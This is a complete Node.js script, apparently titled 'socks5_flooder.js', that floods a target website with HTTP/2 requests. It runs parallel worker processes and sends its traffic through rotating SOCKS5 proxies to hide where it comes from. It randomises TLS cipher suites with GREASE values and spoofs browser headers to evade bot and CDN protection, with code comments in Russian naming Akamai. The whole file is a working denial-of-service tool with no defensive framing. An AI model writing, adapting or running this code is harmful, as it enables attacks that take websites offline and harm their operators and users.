const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.log(`node socks5_flooder.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomString(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}

// Правильные cipher suites (имена, как любит Node.js и Akamai)
const cipherList = [
    "GREASE", // GREASE будет заменён на случайный
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
];

// GREASE значения
const greaseValues = ["0x0a0a", "0x1a1a", "0x2a2a", "0x3a3a", "0x4a4a", "0x5a5a", "0x6a6a", "0x7a7a"];

function getCiphers() {
    const grease = randomElement(greaseValues);
    const list = cipherList.slice();
    list[0] = grease; // Первый — GREASE
    if (Math.random() > 0.5) list.push(randomElement(greaseValues));
    return list.join(":");
}

const curves = "GREASE:X25519:P-256:P-384:P-521"; // GREASE + стандартные

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9,en;q=0.8"];
const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];
const referers = ["https://www.google.com/", "https://www.bing.com/", ""];

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 1);
}

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + Math.floor(Math.random() * 900000 + 100000);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;
    if (Math.random() > 0.5) headers["dnt"] = "1";

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const proxyParts = proxyAddr.replace('socks5://', '').split(':');

    const socksOptions = {
        proxy: { host: proxyParts[0], port: parseInt(proxyParts[1]), type: 5 },
        command: 'connect',
        destination: { host: parsedTarget.host, port: 443 },
        timeout: 8000
    };

    SocksClient.createConnection(socksOptions, (err, info) => {
        if (err || !info) return;

        const connection = info.socket;
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            ciphers: getCiphers(),  // Правильный формат
            ecdhCurve: curves.replace("GREASE", randomElement(greaseValues)), // GREASE в curves
            honorCipherOrder: true,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: { maxConcurrentStreams: 30, initialWindowSize: 65535, enablePush: false }
        });

        let interval = null;

        client.on('connect', () => {
            interval = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const req = client.request(buildHeaders());
                    req.end();
                    req.on('error', () => {});
                }
            }, 1000);
        });

        client.on('goaway', () => clearInterval(interval) || client.destroy() || tlsConn.destroy() || connection.destroy());
        client.on('error', () => {});
        client.on('close', () => clearInterval(interval) || connection.destroy());
        connection.on('error', () => client.destroy());
        connection.on('end', () => client.destroy());
    });
}
